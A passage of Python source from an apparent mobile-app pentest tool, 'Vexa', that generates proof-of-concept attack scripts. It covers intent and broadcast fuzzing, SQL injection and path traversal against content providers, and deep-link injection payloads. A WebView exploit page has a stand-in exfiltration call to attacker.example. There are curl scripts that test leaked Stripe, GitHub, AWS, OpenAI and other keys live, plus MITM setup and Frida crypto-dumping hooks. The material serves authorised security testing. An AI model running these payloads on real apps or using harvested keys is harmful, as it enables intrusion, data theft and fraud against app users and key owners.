{chr(10).join(f'  "{s["name"]}"' for s in services[:6])}
)

for S in "${{SVC[@]}}"; do
    echo "==== $PKG/$S ===="
    adb shell am startservice -n "$PKG/$S" 2>&1
    adb shell am startservice -n "$PKG/$S" --es action admin --ei userid 0 --ez bypass true 2>&1
    adb shell am startservice -n "$PKG/$S" --es cmd 'ls /data/data/'$PKG 2>&1
    sleep 1
    CRASH=$(adb shell "logcat -d -t 30 | grep -E 'FATAL|AndroidRuntime'" 2>/dev/null)
    if [ -n "$CRASH" ]; then echo "[!] CRASH: $CRASH"; fi
    adb shell logcat -c
done
"""
    return PoC(
        id="poc-exported-services",
        finding_id="exported-service",
        title=f"Fuzz {len(services)} exported services",
        severity="medium",
        why="Exported services accept Intents from any app. Often perform privileged actions without re-authenticating the caller.",
        impact="Trigger background sync / refresh / API calls with attacker-controlled data.",
        artifacts=[PoCArtifact("fuzz_services.sh", sh, "sh")],
        automated_cmd=["shell", "am", "startservice", "-n", f"{pkg}/{services[0]['name']}"],
        success_indicator="Started service",
    )


def poc_exported_receivers(pkg: str, receivers: list) -> Optional[PoC]:
    if not receivers:
        return None
    sh = f"""#!/bin/bash
# Vexa PoC: Broadcast to exported receivers in {pkg}
PKG="{pkg}"

declare -a RCV=(
{chr(10).join(f'  "{r["name"]}"' for r in receivers[:6])}
)

for R in "${{RCV[@]}}"; do
    echo "==== $PKG/$R ===="
    adb shell am broadcast -n "$PKG/$R" 2>&1 | head -3
    adb shell am broadcast -n "$PKG/$R" --ez debug true --ez admin true --es token "FAKE_TOKEN" 2>&1 | head -3
    sleep 1
done

# Also try common spoofable system actions
for ACT in BOOT_COMPLETED USER_PRESENT CONNECTIVITY_CHANGE; do
    echo "[*] Spoofing android.intent.action.$ACT"
    adb shell am broadcast -a "android.intent.action.$ACT" 2>&1 | head -2
done
"""
    return PoC(
        id="poc-exported-receivers",
        finding_id="exported-receiver",
        title=f"Broadcast to {len(receivers)} exported receivers",
        severity="medium",
        why="Receivers commonly perform privileged actions (logout, sync, refresh tokens). Many don't validate the sender.",
        impact="Trigger state-changing actions remotely — log the user out, force sync, replay events.",
        artifacts=[PoCArtifact("fuzz_receivers.sh", sh, "sh")],
        automated_cmd=["shell", "am", "broadcast", "-n", f"{pkg}/{receivers[0]['name']}"],
        success_indicator="Broadcast completed",
    )


def poc_content_providers(pkg: str, providers: list) -> Optional[PoC]:
    if not providers:
        return None
    auths = []
    for p in providers[:6]:
        a = (p.get("authorities") or p["name"] or "").split(";")[0]
        if a:
            auths.append(a)
    if not auths:
        return None
    sh = f"""#!/bin/bash
# Vexa PoC: SQLi + path traversal probes against exported content providers
# Target package: {pkg}

declare -a AUTH=(
{chr(10).join(f'  "{a}"' for a in auths)}
)

declare -a SQLI=(
  "1=1"
  "1=1) UNION SELECT name,sql FROM sqlite_master--"
  "1=1) UNION SELECT 1,2,3,4,5--"
  "id IS NOT NULL"
)

declare -a TRAVERSAL=(
  "/../../../etc/hosts"
  "/../../databases/users.db"
  "/../shared_prefs/auth.xml"
  "/../shared_prefs/secret.xml"
)

for A in "${{AUTH[@]}}"; do
    echo "================= content://$A/ ================="
    echo "[1] Baseline query"
    adb shell content query --uri "content://$A/" 2>&1 | head -10

    echo "[2] SQL injection in WHERE clause"
    for P in "${{SQLI[@]}}"; do
        echo "    --where \\"$P\\""
        OUT=$(adb shell content query --uri "content://$A/" --where "$P" 2>&1 | head -10)
        echo "$OUT"
        if echo "$OUT" | grep -qE "Row:|sqlite_master"; then
            echo "    [!!] LIKELY VULNERABLE — data returned"
        fi
    done

    echo "[3] Path traversal in openFile()"
    for P in "${{TRAVERSAL[@]}}"; do
        echo "    content://$A$P"
        OUT=$(adb shell content read --uri "content://$A$P" 2>&1 | head -5)
        echo "$OUT" | head -3
        if echo "$OUT" | grep -qE "localhost|root:|<\\?xml"; then
            echo "    [!!] LIKELY VULNERABLE — file contents leaked"
        fi
    done
done
"""
    return PoC(
        id="poc-content-providers",
        finding_id="exported-provider",
        title=f"SQLi + path traversal on {len(auths)} content providers",
        severity="high",
        why="Exported content providers without permission are reachable by any app. Two classic attacks: SQL injection in query() and path traversal in openFile().",
        impact="Read/write arbitrary tables. Read arbitrary files in the app's sandbox (databases, shared_prefs).",
        artifacts=[PoCArtifact("provider_attack.sh", sh, "sh")],
        automated_cmd=["shell", "content", "query", "--uri", f"content://{auths[0]}/"],
        success_indicator="Row:",
    )


def poc_deeplinks(pkg: str, deeplinks: list) -> Optional[PoC]:
    unique = []
    seen = set()
    for d in deeplinks:
        u = d.get("uri")
        if u and u not in seen:
            seen.add(u)
            unique.append(d)
    if not unique:
        return None

    sample = unique[:8]

    # 1. HTML PoC page
    rows = "\n".join(
        f'    <li><a href="{html.escape(d["uri"].replace("*", "x"))}">'
        f'{html.escape(d["uri"])}</a></li>'
        for d in sample
    )
    safe_uri = sample[0]["uri"].replace("*", "x").replace("'", "")
    poc_html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Vexa Deep Link PoC — {html.escape(pkg)}</title>
  <style>
    body {{ font: 16px/1.5 -apple-system, sans-serif; max-width: 720px;
           margin: 40px auto; padding: 20px; background: #1a1a1a; color: #eee; }}
    h1 {{ color: #6c7bff; }}
    code {{ background: #000; padding: 2px 6px; border-radius: 4px; color: #aff; }}
    li {{ margin: 8px 0; }}
    a {{ color: #6c7bff; }}
    button {{ background: #ff3b6b; color: white; border: none;
             padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 16px; }}
  </style>
</head>
<body>
  <h1>Deep Link PoC</h1>
  <p>Target: <code>{html.escape(pkg)}</code></p>
  <p>Open this page in the device's browser. Tapping any link below will fire
     the deep link into the target app.</p>
  <ul>
{rows}
  </ul>
  <hr>
  <h2>Auto-trigger (3 second delay)</h2>
  <p>Click below to auto-redirect into the app. Useful to test what happens when
     a user lands on an attacker-controlled page.</p>
  <button onclick="setTimeout(()=>location.href='{safe_uri}', 100)">
    Trigger {html.escape(safe_uri)}
  </button>
  <hr>
  <h2>Smuggled payload variants</h2>
  <ul>
    <li><a href="{safe_uri}?next=https://attacker.example/xss.html">
        WebView URL injection via ?next=</a></li>
    <li><a href="{safe_uri}?url=javascript:alert(1)">
        javascript: scheme smuggle</a></li>
    <li><a href="{safe_uri}?redirect=//attacker.example/">
        Open redirect (protocol-relative)</a></li>
  </ul>
</body>
</html>
"""

    # 2. Python web server one-liner + adb fuzzer
    py_fuzzer = f"""#!/usr/bin/env python3
\"\"\"Vexa PoC: deep link fuzzer for {pkg}

Tries each detected deep link with a battery of injection payloads via adb.
\"\"\"
import subprocess, urllib.parse

DEEPLINKS = [
{chr(10).join(f'    {repr(d["uri"])},' for d in sample)}
]

PAYLOADS = [
    "../../../etc/passwd",
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "https://attacker.example/xss.html",
    "file:///data/data/{pkg}/databases/",
    "0", "-1", "2147483647",
    "%00admin", "%2e%2e/", "%5c..%5c",
    "' OR '1'='1",
]

def adb_open(uri):
    r = subprocess.run(
        ["adb", "shell", "am", "start", "-W",
         "-a", "android.intent.action.VIEW", "-d", uri],
        capture_output=True, text=True, timeout=15)
    return r.stdout + r.stderr

for tmpl in DEEPLINKS:
    base = tmpl.replace("*", "x")
    print(f"\\n==== {{base}} ====")
    print(adb_open(base)[:200])

    # Try common parameter names with injection payloads
    for param in ("next", "url", "redirect", "target", "path", "id", "data"):
        for p in PAYLOADS:
            full = base + ("&" if "?" in base else "?") + f"{{param}}=" + urllib.parse.quote(p)
            out = adb_open(full)
            if "Error" in out or "FATAL" in out:
                print(f"  [!] CRASH or error: {{full}}")
                print(out[:300])
"""

    # 3. Quick HTTP server to host poc.html
    server_sh = """#!/bin/bash
# Vexa PoC: serve the deep link PoC page on your machine
# Then visit http://<your-ip>:8080/poc.html on the device's browser
python3 -m http.server 8080
"""
    return PoC(
        id="poc-deeplinks",
        finding_id="deeplinks-exposed",
        title=f"Deep link exploitation suite ({len(unique)} URIs)",
        severity="high",
        why="Deep links are externally reachable URIs. A malicious website opened in the device's browser can fire them. Attack surface for open-redirect, WebView injection, parameter smuggling, and pre-auth state changes.",
        impact="A user clicking a link on attacker.example triggers internal app flows, possibly with attacker-controlled URLs/data.",
        artifacts=[
            PoCArtifact("poc.html", poc_html, "html"),
            PoCArtifact("fuzz_deeplinks.py", py_fuzzer, "py"),
            PoCArtifact("serve.sh", server_sh, "sh"),
        ],
        automated_cmd=["shell", "am", "start", "-W", "-a", "android.intent.action.VIEW",
                       "-d", sample[0]["uri"].replace("*", "x")],
        success_indicator="Status: ok",
    )


def poc_webview(pkg: str, has_js: bool, has_bridge: bool, has_file: bool) -> Optional[PoC]:
    if not (has_js or has_bridge or has_file):
        return None
    payload = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Vexa WebView Exploit — {html.escape(pkg)}</title>
</head>
<body>
<h1>WebView exploit</h1>
<p>Loaded inside the target app's WebView, this page demonstrates impact.</p>

<pre id="out">running…</pre>

<script>
const out = document.getElementById('out');
const log = m => out.textContent += '\\n' + m;

log('User-Agent: ' + navigator.userAgent);
log('Origin: ' + location.origin);
log('Cookies: ' + document.cookie);
"""
    if has_bridge:
        payload += f"""
// ---- Test addJavascriptInterface bridges ----
log('\\n[*] Probing for JS bridges...');
for (const name of ['Android', 'AndroidBridge', 'jsBridge', 'NativeBridge', 'app', 'webkit']) {{
  if (typeof window[name] !== 'undefined') {{
    log('[!] Bridge found: ' + name);
    try {{
      const methods = [];
      for (const k in window[name]) {{ methods.push(k); }}
      log('    methods: ' + methods.join(', '));
      // Try invoking each method with no args
      methods.forEach(m => {{
        try {{
          const r = window[name][m]();
          log('    ' + name + '.' + m + '() = ' + JSON.stringify(r).slice(0,200));
        }} catch(e) {{ log('    ' + name + '.' + m + '() threw: ' + e.message); }}
      }});
    }} catch(e) {{ log('    enumeration failed: ' + e); }}
  }}
}}
"""
    if has_file:
        payload += f"""
// ---- Test file:// access (works if setAllowFileAccess + JS enabled) ----
log('\\n[*] Probing file:// access...');
fetch('file:///data/data/{pkg}/shared_prefs/')
  .then(r => r.text())
  .then(t => log('[!] file:// READ OK (length=' + t.length + ')'))
  .catch(e => log('    file:// blocked: ' + e.message));
"""
    payload += """
log('\\n[*] Sending findings to attacker.example (in real attack)...');
// fetch('https://attacker.example/exfil', {method:'POST', body: out.textContent});
</script>
</body>
</html>
"""
    return PoC(
        id="poc-webview",
        finding_id="js-interface-bridge" if has_bridge else "javascript-enabled",
        title="WebView exploitation page",
        severity="high" if has_bridge else "medium",
        why=("WebView with JavaScript enabled lets HTML execute code in the app's context. "
             "If addJavascriptInterface is also used, JS can invoke Java methods. "
             "If file:// access is enabled, JS can read local app files."),
        impact="Code execution in WebView context, potential bridge invocation reaching native Java APIs, local file exfiltration.",
        artifacts=[PoCArtifact("webview_exploit.html", payload, "html")],
        automated_cmd=None,
        confidence="needs-device",
    )


def poc_secrets(findings: list) -> list:
    """One PoC per secret type detected, with live-validation curl/aws commands.
    Handles both Android (`secret-<type>-<n>`) and iOS (`ios-secret-<type>-<n>`) IDs."""
    pocs = []
    secrets = [f for f in findings
               if f["id"].startswith("secret-") or f["id"].startswith("ios-secret-")]
    if not secrets:
        return pocs

    # Group by classifier - peek at title text since IDs have multi-word types
    types = {}
    for s in secrets:
        title = (s.get("title") or "").lower()
        if "aws" in title and "access key" in title: t = "aws"
        elif "aws s3" in title or "s3 bucket" in title: t = "aws-s3"
        elif "google" in title or "gcp" in title:     t = "google"
        elif "firebase" in title:                     t = "firebase"
        elif "github" in title:                       t = "github"
        elif "gitlab" in title:                       t = "gitlab"
        elif "stripe" in title:                       t = "stripe"
        elif "paypal" in title or "braintree" in title: t = "paypal"
        elif "square" in title:                       t = "square"
        elif "slack" in title:                        t = "slack"
        elif "discord" in title:                      t = "discord"
        elif "telegram" in title:                     t = "telegram"
        elif "twilio" in title:                       t = "twilio"
        elif "sendgrid" in title:                     t = "sendgrid"
        elif "mailgun" in title:                      t = "mailgun"
        elif "openai" in title:                       t = "openai"
        elif "anthropic" in title:                    t = "anthropic"
        elif "npm" in title:                          t = "npm"
        elif "digitalocean" in title:                 t = "digitalocean"
        elif "azure" in title:                        t = "azure"
        elif "jwt" in title or "json web token" in title: t = "jwt"
        elif "private key" in title or "pgp" in title: t = "private"
        elif "mapbox" in title:                       t = "mapbox"
        else:                                         t = "generic"
        types.setdefault(t, []).append(s)

    for t, group in types.items():
        # Extract actual values from evidence (last token after ': ')
        values = []
        for g in group:
            ev = g.get("evidence", "")
            if ":" in ev:
                v = ev.rsplit(":", 1)[-1].strip()
                if v and "...[truncated]" not in v:
                    values.append(v)
        if not values:
            continue

        if t == "aws":
            sh = f"""#!/bin/bash
# Vexa PoC: validate leaked AWS credentials
# Found {len(values)} candidate(s)
echo "[*] To validate, you need an AWS Secret Access Key (40-char) paired with the Access Key ID"
echo "    The static analyzer found these Access Key ID(s):"
{chr(10).join(f'echo "      {v}"' for v in values[:5])}
echo
echo "[*] Test command (replace SECRET):"
echo '    AWS_ACCESS_KEY_ID={values[0] if values else "AKIA..."} \\\\'
echo '      AWS_SECRET_ACCESS_KEY=<the-40-char-secret> \\\\'
echo '      aws sts get-caller-identity'
echo
echo "[!] If this returns Account/UserId/Arn, the key is LIVE."
"""
            pocs.append(PoC(
                id="poc-secret-aws",
                finding_id=group[0]["id"],
                title=f"Validate {len(values)} AWS Access Key(s)",
                severity="critical", why="Leaked AWS keys give direct API access to the account.",
                impact="Read/write S3, EC2, IAM — depends on the key's policy.",
                artifacts=[PoCArtifact("validate_aws.sh", sh, "sh")],
                confidence="static",
            ))
        elif t == "google":
            sh = f"""#!/bin/bash
# Vexa PoC: validate leaked Google API keys
# Found {len(values)} candidate(s)
{chr(10).join(f'''
echo "[*] Testing key: {v}"
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key={v}" | head -c 400
echo
echo "  (status='OK' means LIVE; status='REQUEST_DENIED' may still be valid for other APIs)"
echo
''' for v in values[:5])}
"""
            pocs.append(PoC(
                id="poc-secret-google",
                finding_id=group[0]["id"],
                title=f"Validate {len(values)} Google API key(s)",
                severity="high",
                why="Leaked Google API keys may grant access to Maps, YouTube, Firebase, etc.",
                impact="Quota theft, reputation damage, potential PII access if Firebase admin.",
                artifacts=[PoCArtifact("validate_google.sh", sh, "sh")],
                confidence="static",
            ))
        elif t == "stripe":
            sh = f"""#!/bin/bash
# Vexa PoC: validate Stripe secret keys
{chr(10).join(f'''
echo "[*] Testing: {v}"
curl -s -u {v}: https://api.stripe.com/v1/balance | head -c 500
echo
''' for v in values[:5])}
echo
echo "[!] If JSON balance is returned, the key is LIVE and grants full account API access."
"""
            pocs.append(PoC(
                id="poc-secret-stripe",
                finding_id=group[0]["id"],
                title=f"Validate {len(values)} Stripe key(s)",
                severity="critical",
                why="Stripe secret keys allow full Stripe API access — read charges, customers, refund, transfer.",
                impact="Financial: refunds, transfers, customer data extraction.",
                artifacts=[PoCArtifact("validate_stripe.sh", sh, "sh")],
                confidence="static",
            ))
        elif t == "github":
            sh = f"""#!/bin/bash
# Vexa PoC: validate GitHub tokens
{chr(10).join(f'''
echo "[*] Testing: {v[:20]}..."
curl -s -H "Authorization: token {v}" https://api.github.com/user | head -c 500
echo
''' for v in values[:5])}
echo
echo "[!] If user JSON is returned, token is LIVE."
"""
            pocs.append(PoC(
                id="poc-secret-github",
                finding_id=group[0]["id"],
                title=f"Validate {len(values)} GitHub token(s)",
                severity="critical", why="GitHub tokens grant repo access.",
                impact="Read/write source code, push malicious commits, exfiltrate private repos.",
                artifacts=[PoCArtifact("validate_github.sh", sh, "sh")],
                confidence="static",
            ))
        elif t == "firebase":
            sh = f"""#!/bin/bash
# Vexa PoC: test for open Firebase Realtime Database
{chr(10).join(f'''
echo "[*] Testing: {v}"
curl -s "{v}/.json" | head -c 1000
echo
echo "[!] If JSON data is returned (not 'Permission denied'), DB is OPEN to the world."
''' for v in values[:5])}
"""
            pocs.append(PoC(
                id="poc-secret-firebase",
                finding_id=group[0]["id"],
                title=f"Test {len(values)} Firebase DB(s) for misconfig",
                severity="medium", why="Firebase Realtime DBs are often left world-readable.",
                impact="Read all DB contents — user data, analytics, app config.",
                artifacts=[PoCArtifact("validate_firebase.sh", sh, "sh")],
                confidence="static",
            ))
        elif t == "jwt":
            sh = f"""#!/bin/bash
# Vexa PoC: decode JWT(s) (no signature verification)
{chr(10).join(f'''
echo "[*] JWT: {v[:30]}..."
echo "{v}" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "(decode failed)"
echo
''' for v in values[:5])}
echo
echo "Look for: long expiry, role/admin claims, sensitive PII in payload."
"""
            pocs.append(PoC(
                id="poc-secret-jwt", finding_id=group[0]["id"],
                title=f"Decode {len(values)} JWT(s)",
                severity="medium", why="JWTs in the binary may be long-lived service tokens or leaked user tokens.",
                impact="Authenticated API access if token is still valid.",
                artifacts=[PoCArtifact("decode_jwt.sh", sh, "sh")], confidence="static",
            ))
        elif t == "slack":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Testing: {v[:25]}..."\ncurl -s -X POST -d "token={v}" https://slack.com/api/auth.test\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-slack", finding_id=group[0]["id"],
                title=f"Validate {len(values)} Slack token(s)",
                severity="high", why="Slack tokens grant workspace API access.",
                impact="Read messages, files, exfiltrate workspace data, post as user.",
                artifacts=[PoCArtifact("validate_slack.sh", sh, "sh")], confidence="static",
            ))
        elif t == "twilio":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Twilio Account SID: {v}"\necho "  Pair with auth token (32 hex from same binary):"\necho "  curl -s -u {v}:<AUTH_TOKEN> https://api.twilio.com/2010-04-01/Accounts/{v}.json"'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-twilio", finding_id=group[0]["id"],
                title=f"Enumerate {len(values)} Twilio account(s)",
                severity="high", why="Twilio API access enables SMS/voice abuse.",
                impact="Send SMS, drain account balance.",
                artifacts=[PoCArtifact("validate_twilio.sh", sh, "sh")], confidence="static",
            ))
        elif t == "sendgrid":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Testing: {v[:30]}..."\ncurl -s -H "Authorization: Bearer {v}" https://api.sendgrid.com/v3/user/profile\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-sendgrid", finding_id=group[0]["id"],
                title=f"Validate {len(values)} SendGrid key(s)",
                severity="high", why="SendGrid key grants ability to send mail.",
                impact="Phishing campaigns from a trusted domain.",
                artifacts=[PoCArtifact("validate_sendgrid.sh", sh, "sh")], confidence="static",
            ))
        elif t == "mailgun":
            sh = "#!/bin/bash\n" + "\n".join(
                f'curl -s --user "api:{v}" https://api.mailgun.net/v3/domains | head -c 500\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-mailgun", finding_id=group[0]["id"],
                title=f"Validate {len(values)} Mailgun key(s)",
                severity="high", why="Mailgun key grants mail sending.",
                impact="Phishing from trusted domain.",
                artifacts=[PoCArtifact("validate_mailgun.sh", sh, "sh")], confidence="static",
            ))
        elif t == "openai":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Testing: {v[:20]}..."\ncurl -s -H "Authorization: Bearer {v}" https://api.openai.com/v1/models | head -c 600\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-openai", finding_id=group[0]["id"],
                title=f"Validate {len(values)} OpenAI key(s)",
                severity="high", why="OpenAI keys grant API access - billing impact.",
                impact="Quota theft on victim's billing account.",
                artifacts=[PoCArtifact("validate_openai.sh", sh, "sh")], confidence="static",
            ))
        elif t == "anthropic":
            sh = "#!/bin/bash\n" + "\n".join(
                f"""echo "[*] Testing: {v[:20]}..."
curl -s -H "x-api-key: {v}" -H "anthropic-version: 2023-06-01" \\
  https://api.anthropic.com/v1/messages \\
  -d '{{"model":"claude-haiku-4-5-20251001","max_tokens":1,"messages":[{{"role":"user","content":"hi"}}]}}'
echo"""
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-anthropic", finding_id=group[0]["id"],
                title=f"Validate {len(values)} Anthropic key(s)",
                severity="high", why="Anthropic keys grant model access - billing impact.",
                impact="Quota theft on victim's billing account.",
                artifacts=[PoCArtifact("validate_anthropic.sh", sh, "sh")], confidence="static",
            ))
        elif t == "discord":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Testing: {v[:30]}..."\ncurl -s -H "Authorization: Bot {v}" https://discord.com/api/v10/users/@me\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-discord", finding_id=group[0]["id"],
                title=f"Validate {len(values)} Discord bot token(s)",
                severity="high", why="Discord bot tokens grant control of the bot user.",
                impact="Read/write messages, manage servers if bot has admin perms.",
                artifacts=[PoCArtifact("validate_discord.sh", sh, "sh")], confidence="static",
            ))
        elif t == "telegram":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Testing: {v[:25]}..."\ncurl -s "https://api.telegram.org/bot{v}/getMe"\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-telegram", finding_id=group[0]["id"],
                title=f"Validate {len(values)} Telegram bot(s)",
                severity="high", why="Telegram bot tokens grant control of the bot.",
                impact="Read messages from chats the bot is in, post as the bot.",
                artifacts=[PoCArtifact("validate_telegram.sh", sh, "sh")], confidence="static",
            ))
        elif t == "gitlab":
            sh = "#!/bin/bash\n" + "\n".join(
                f'curl -s -H "PRIVATE-TOKEN: {v}" https://gitlab.com/api/v4/user | head -c 500\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-gitlab", finding_id=group[0]["id"],
                title=f"Validate {len(values)} GitLab PAT(s)",
                severity="critical", why="GitLab PATs grant repo + group access.",
                impact="Read/write source, exfil private repos, push malicious code.",
                artifacts=[PoCArtifact("validate_gitlab.sh", sh, "sh")], confidence="static",
            ))
        elif t == "npm":
            sh = "#!/bin/bash\n" + "\n".join(
                f'curl -s -H "Authorization: Bearer {v}" https://registry.npmjs.org/-/whoami\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-npm", finding_id=group[0]["id"],
                title=f"Validate {len(values)} npm token(s)",
                severity="high", why="npm tokens can publish packages - supply-chain risk.",
                impact="Publish backdoored versions of victim's npm packages.",
                artifacts=[PoCArtifact("validate_npm.sh", sh, "sh")], confidence="static",
            ))
        elif t == "digitalocean":
            sh = "#!/bin/bash\n" + "\n".join(
                f'curl -s -H "Authorization: Bearer {v}" https://api.digitalocean.com/v2/account | head -c 500\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-do", finding_id=group[0]["id"],
                title=f"Validate {len(values)} DigitalOcean PAT(s)",
                severity="critical", why="DO PATs grant infra control.",
                impact="Spin up/destroy droplets, billing impact.",
                artifacts=[PoCArtifact("validate_do.sh", sh, "sh")], confidence="static",
            ))
        elif t == "private":
            sh = """#!/bin/bash
echo "[!] Private key found in app - extract and test:"
echo "  For PEM:  openssl rsa -in private.pem -text -noout"
echo "  For SSH:  ssh-keygen -y -f id_rsa"
echo "  For PGP:  gpg --import private.asc"
echo
echo "Try matching public counterpart against:"
echo "  - Known service hosts (github.com, gitlab.com, *.s3.amazonaws.com)"
echo "  - The app's TLS endpoints (cert pinning may use this same key)"
"""
            pocs.append(PoC(
                id="poc-secret-privatekey", finding_id=group[0]["id"],
                title=f"Extract & test {len(values)} private key(s)",
                severity="critical", why="Private keys allow signing/decryption.",
                impact="Impersonate the legitimate service or decrypt traffic.",
                artifacts=[PoCArtifact("extract_private_key.sh", sh, "sh")], confidence="static",
            ))
        elif t == "aws-s3":
            sh = "#!/bin/bash\n" + "\n".join(
                f'echo "[*] Testing: {v}"\ncurl -sI "{v}" | head -5\necho "  List bucket: aws s3 ls {v} --no-sign-request"\necho'
                for v in values[:5])
            pocs.append(PoC(
                id="poc-secret-s3", finding_id=group[0]["id"],
                title=f"Probe {len(values)} S3 bucket(s)",
                severity="medium", why="S3 buckets are commonly misconfigured for public read/write.",
                impact="Public read = data leak; public write = serve malicious payloads.",
                artifacts=[PoCArtifact("probe_s3.sh", sh, "sh")], confidence="static",
            ))

    return pocs


def poc_mitm(pkg: str, ids: set) -> Optional[PoC]:
    if not any(i in ids for i in ("trustmanager-bypass", "nsc-cleartext", "nsc-user-cas",
                                   "cleartext-traffic")):
        return None
    sev = "critical" if "trustmanager-bypass" in ids else "medium"
    setup_sh = f"""#!/bin/bash
# Vexa PoC: set up MITM against {pkg}
# Pre-req: install Burp Suite (https://portswigger.net/burp/communitydownload)
#          or mitmproxy (pip install mitmproxy)

YOUR_IP=$(hostname -I 2>/dev/null | awk '{{print $1}}' || ipconfig getifaddr en0)
if [ -z "$YOUR_IP" ]; then YOUR_IP="<your-ip>"; fi

echo "[*] Your machine's IP appears to be: $YOUR_IP"
echo "[*] Start Burp on port 8080 with bind 'all interfaces'"
echo
echo "[*] Force the device through the proxy:"
echo "    adb shell settings put global http_proxy $YOUR_IP:8080"
echo
echo "[*] On device browser, visit http://burp and install the cacert.der as a USER CA"
echo
echo "[*] Launch the target app:"
echo "    adb shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1"
echo
echo "[*] To unset proxy after testing:"
echo "    adb shell settings put global http_proxy :0"
"""
    return PoC(
        id="poc-mitm",
        finding_id="trustmanager-bypass" if "trustmanager-bypass" in ids else "cleartext-traffic",
        title="MITM the app's network traffic",
        severity=sev,
        why="App does not properly validate TLS — either accepts any cert (TrustManager bypass), allows cleartext, or trusts user CAs.",
        impact="Full read/write of the app's API traffic. Modify responses to bypass auth, inject content, etc.",
        artifacts=[PoCArtifact("mitm_setup.sh", setup_sh, "sh")],
        automated_cmd=None,
        confidence="needs-device",
    )


def poc_weak_crypto(pkg: str, ids: set) -> Optional[PoC]:
    if not any(i in ids for i in ("weak-cipher-des", "weak-cipher-3des", "weak-cipher-rc4",
                                  "cipher-ecb-mode", "weak-hash-md5", "weak-hash-sha1")):
        return None
    frida_js = f"""// Vexa PoC: dump ALL Cipher operations at runtime for {pkg}
// Reveals weak algorithms in use and the actual plaintext/key/IV/ciphertext.
// Run:  frida -U -f {pkg} -l crypto_dump.js --no-pause

Java.perform(function() {{
    var Cipher = Java.use('javax.crypto.Cipher');
    var Mac = Java.use('javax.crypto.Mac');
    var MD = Java.use('java.security.MessageDigest');
    var b64 = Java.use('android.util.Base64');

    function bytesToHex(b) {{
        if (!b) return "<null>";
        var hex = "0123456789abcdef", out = "";
        for (var i = 0; i < Math.min(b.length, 64); i++) {{
            var v = b[i] & 0xff;
            out += hex[v >> 4] + hex[v & 15];
        }}
        return out + (b.length > 64 ? "...(" + b.length + " bytes)" : "");
    }}

    Cipher.init.overload('int', 'java.security.Key').implementation = function(opmode, key) {{
        var algo = this.getAlgorithm();
        var keyBytes = key.getEncoded ? key.getEncoded() : null;
        console.log("[CIPHER] init(" + opmode + ") algo=" + algo +
                    " key=" + (keyBytes ? bytesToHex(keyBytes) : "<opaque>"));
        return this.init(opmode, key);
    }};

    Cipher.doFinal.overload('[B').implementation = function(input) {{
        var algo = this.getAlgorithm();
        var output = this.doFinal(input);
        console.log("[CIPHER] " + algo + "  in=" + bytesToHex(input));
        console.log("[CIPHER] " + algo + " out=" + bytesToHex(output));
        return output;
    }};

    MD.digest.overload('[B').implementation = function(input) {{
        var out = this.digest(input);
        console.log("[HASH] " + this.getAlgorithm() + "(" + bytesToHex(input) + ") = " + bytesToHex(out));
        return out;
    }};
    console.log("[+] Crypto dumper loaded.");
}});
"""
    return PoC(
        id="poc-crypto-dump",
        finding_id="weak-cipher-des",
        title="Runtime crypto interceptor (Frida)",
        severity="high",
        why="Static analysis found weak ciphers/hashes. This Frida script dumps every cipher operation at runtime, revealing the actual plaintext, keys, IVs, and ciphertext.",
        impact="Recover keys hardcoded into the app, decrypt protected fields, observe what data is being weakly encrypted.",
        artifacts=[PoCArtifact("crypto_dump.js", frida_js, "js")],
        automated_cmd=None,
        confidence="needs-device",
    )


def poc_root_bypass(pkg: str) -> PoC:
    """Always available — pentesters often need this for any app on rooted device."""
    return PoC(
        id="poc-root-bypass",
        finding_id="meta",
        title="Root detection bypass (Frida)",
        severity="info",
        why="Many apps refuse to run on rooted devices. This script patches common detection routines.",
        impact="Run the app on rooted device / emulator for further testing.",
        artifacts=[PoCArtifact("root_bypass.js", frida_root_bypass(pkg), "js")],
        automated_cmd=None,
        confidence="needs-device",
    )


def poc_ssl_pinning(pkg: str) -> PoC:
    return PoC(
        id="poc-ssl-bypass",
        finding_id="meta",
        title="SSL pinning bypass (Frida)",
        severity="info",
        why="Most production apps pin SSL certs. This script patches the common pinning libraries to allow MITM.",
        impact="Enable Burp/mitmproxy interception of the app's API traffic.",
        artifacts=[PoCArtifact("ssl_bypass.js", frida_ssl_bypass(pkg), "js")],
        automated_cmd=None,
        confidence="needs-device",
    )


# ---------- Master generator ----------

def generate_ios_pocs(report: dict) -> list:
    """iOS-specific PoCs for IPA scans.
    Generates a PoC for every iOS finding — universal coverage."""
    pkg = report.get("metadata", {}).get("package") or "<bundle>"
    extras = report.get("extras", {})
    findings = report.get("findings", [])
    ids = {f["id"] for f in findings}
    pocs: list = []
    handled_ids = set()

    # ---- Custom URL schemes PoC ----
    schemes = extras.get("url_schemes") or []
    if schemes:
        rows = "\n".join(f'    <li><a href="{html.escape(s)}://test">{html.escape(s)}://test</a></li>'
                          for s in schemes[:10])
        first = html.escape(schemes[0])
        poc_html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Vexa iOS URL Scheme PoC - {html.escape(pkg)}</title>
